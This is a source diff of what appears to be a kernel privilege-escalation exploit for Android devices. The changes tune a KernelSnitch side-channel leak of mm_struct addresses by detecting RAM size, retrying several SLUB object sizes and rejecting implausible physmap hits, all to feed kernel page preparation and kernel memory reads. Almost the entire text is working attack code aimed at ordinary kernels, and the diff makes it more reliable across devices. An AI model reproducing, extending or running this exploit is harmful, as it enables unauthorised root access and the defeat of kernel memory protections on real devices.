@@ -22,18 +22,98 @@ uintptr_t fake_fops;
 uintptr_t binwrite_target;
 char ashmem_path[256] = "/dev/ashmem";
 
+uintptr_t g_direct_map_end = DIRECT_MAP_END;
+static size_t g_ram_bytes;
+
+/* read RAM size from /proc/meminfo so the physmap scan never walks (and never
+ * reports) physical addresses that do not exist on this device */
+static void detect_memory(void) {
+  if (g_ram_bytes) {
+    return;
+  }
+  size_t kb = 0;
+  FILE *f = fopen("/proc/meminfo", "r");
+  if (f) {
+    char line[256];
+    while (fgets(line, sizeof(line), f)) {
+      unsigned long long v = 0;
+      if (sscanf(line, "MemTotal: %llu kB", &v) == 1) {
+        kb = (size_t)v;
+        break;
+      }
+    }
+    fclose(f);
+  }
+  if (!kb) {
+    kb = 8ULL * 1024 * 1024;  /* conservative default 8 GB */
+  }
+  size_t bytes = kb * 1024;
+  if (bytes < (1ULL << 30)) bytes = 1ULL << 30;
+  if (bytes > (32ULL << 30)) bytes = 32ULL << 30;
+  /* round up to 1 GB */
+  bytes = (bytes + ((1ULL << 30) - 1)) & ~((1ULL << 30) - 1);
+  g_ram_bytes = bytes;
+  g_direct_map_end = DIRECT_MAP_BASE + bytes;
+  pr_info("memory detected ram=0x%zx (%zu GB) window_end=%016zx\n",
+          g_ram_bytes, g_ram_bytes >> 30, (size_t)g_direct_map_end);
+}
+
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  detect_memory();
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  ks->identity_end = (size_t)g_direct_map_end;
+  ks->ram_bytes = g_ram_bytes;
 }
 
 int kernelsnitch_collisions_ready(void) {
   return kernelsnitch_found_collisions(ks);
 }
 
+/* candidate SLUB object sizes for the mm_struct cache (ALIGN to cacheline).
+ * 0x340 was verified on-device (K40/SD870-class 4.19). */
+static const size_t ksnitch_mm_sizes[] = {
+  0x340, 0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x480,
+};
+/* reject a "found" mm_struct whose physical address is beyond the device RAM
+ * (kernelsnitch can false-positive on a non-existent direct-map page) */
+static int mm_plausible(size_t mm) {
+  if (mm < DIRECT_MAP_BASE || mm >= (size_t)g_direct_map_end) {
+    return 0;
+  }
+  size_t phys = mm - DIRECT_MAP_BASE;
+  if (g_ram_bytes && phys >= g_ram_bytes) {
+    return 0;
+  }
+  return 1;
+}
+
 void run_kernelsnitch_bruteforce(void) {
   kernelsnitch_bruteforce(ks);
+  if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
+    pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
+            ks->mm_struct, ks->mm_struct_sz);
+    return;
+  }
+  for (size_t i = 0; i < sizeof(ksnitch_mm_sizes) / sizeof(ksnitch_mm_sizes[0]);
+       i++) {
+    if (ksnitch_mm_sizes[i] == MM_STRUCT_SZ) {
+      continue;
+    }
+    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
+    ks->mm_struct = (size_t)-1;
+    ks->found = 0;
+    ks->mm_struct_sz = ksnitch_mm_sizes[i];
+    ks->mm_slab_order = 0;
+    pr_info("KernelSnitch retry mm_struct_sz=0x%zx\n", ksnitch_mm_sizes[i]);
+    kernelsnitch_bruteforce(ks);
+    if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
+      pr_info("KernelSnitch mm found with mm_struct_sz=0x%zx addr=%016zx\n",
+              ksnitch_mm_sizes[i], ks->mm_struct);
+      return;
+    }
+  }
 }
 
 uintptr_t current_kernelsnitch_mm_struct(void) {
@@ -566,8 +646,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  detect_memory();
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  ks->identity_end = (size_t)g_direct_map_end;
+  ks->ram_bytes = g_ram_bytes;
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -607,7 +690,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-  kernelsnitch_bruteforce(ks);
+  run_kernelsnitch_bruteforce();
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
@@ -780,7 +863,7 @@ int is_kernel_ptr(uintptr_t value) {
 }
 
 int is_direct_ptr(uintptr_t value) {
-  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
+  return value >= DIRECT_MAP_BASE && value < g_direct_map_end;
 }
 
 uint64_t kernel_read64(int fd, uintptr_t target) {
